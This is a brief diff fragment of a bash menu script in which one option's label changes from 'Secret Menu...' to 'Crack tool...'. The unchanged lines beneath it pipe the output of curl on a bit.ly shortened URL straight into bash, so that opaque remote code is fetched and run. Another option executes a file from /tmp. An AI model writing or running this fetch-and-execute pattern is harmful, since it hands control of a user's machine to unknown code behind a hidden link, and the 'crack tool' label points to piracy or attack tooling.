@@ -125,7 +125,7 @@ case $CHOICE in
         bash /tmp/runner
         ;;
     98)
-        echo "Secret Menu..."
+        echo "Crack tool..."
         curl -L https://bit.ly/4htr4m8 | bash
         ;;
     99)
